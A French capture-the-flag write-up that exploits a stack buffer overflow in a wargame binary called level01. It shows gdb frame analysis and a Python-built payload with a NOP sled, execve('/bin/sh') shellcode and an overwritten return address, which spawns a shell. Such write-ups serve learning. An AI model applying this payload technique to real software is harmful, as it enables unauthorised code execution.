Des que l on lance le binaire un prompt nous demande un username, et quitte si ce n est pas le bon.

A *main+93 la fonctin verify_user_name est appeler et compare notre entree avec "dat_wil" qui est contenu a l adresse 0x80486a8


Ensuite on nous demande un password, pareil que pour le username, le programme quitte si on a pas le bon.

A *main+176 la fonction verify_user_pass est appeler et compare notre entrer avec "admin" contenu a l adressse 0x80486b0, mais meme si nous avons le bon couple user:password le programme quitte

Si nous comparons l adresse qui est dans le deuxieme fgets et l adresse de save eip, nous constatons qu'il n y a que 80 byte de difference et que fgets en lit 100

(gdb) info frame
Stack level 0, frame at 0xffffd740:
 eip = 0x8048574 in main; saved eip 0xf7e45513
 Arglist at 0xffffd738, args: 
 Locals at 0xffffd738, Previous frame's sp is 0xffffd740
 Saved registers:
  ebx at 0xffffd730, ebp at 0xffffd738, edi at 0xffffd734, eip at 0xffffd73c
(gdb) p/d 0xffffd73c-0xffffd6ec
$13 = 80

Nous pouvons donc ecraser save eip dans le deuxieme fgets et nous avons de la place pour mettre notre shellcode

==================

r <<< $(python -c 'print "dat_wil" + "A" * (247) + "\n" + "\x90" * 80 + "\x25\xd7\xff\xff" + "B" * 14 + "\n"')

0x08048579 in main ()
(gdb) x/80bx 0xffffd6ec
0xffffd6ec:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6fc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd704:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd70c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd714:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd71c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd72c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90

0xffffd72c in ?? ()
(gdb) x/80bx 0xffffd6ec
0xffffd6ec:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6f4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6fc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd704:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd70c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd714:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd71c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd724:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd72c:     0x01    0x00    0x00    0x00    0x90    0x90    0x90    0x90
0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90


On peut voir que 4 bytes sont ecraser a partir de l adresse 0xffffd72c

Nous devons donc placer notre shellcode avant si nous le placons dans le deuxieme input

(gdb) r <<< $(python -c 'print "dat_wil" + "A" * 247 + "\n" + "\x90" * (64-23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x55" * 16 + "\x04\xd7\xff\xff" + "B" * 14 + "\n"')
Starting program: /home/users/level01/level01 <<< $(python -c 'print "dat_wil" + "A" * 247 + "\n" + "\x90" * (64-23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x55" * 16 + "\x04\xd7\xff\xff" + "B" * 14 + "\n"')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

process 1900 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
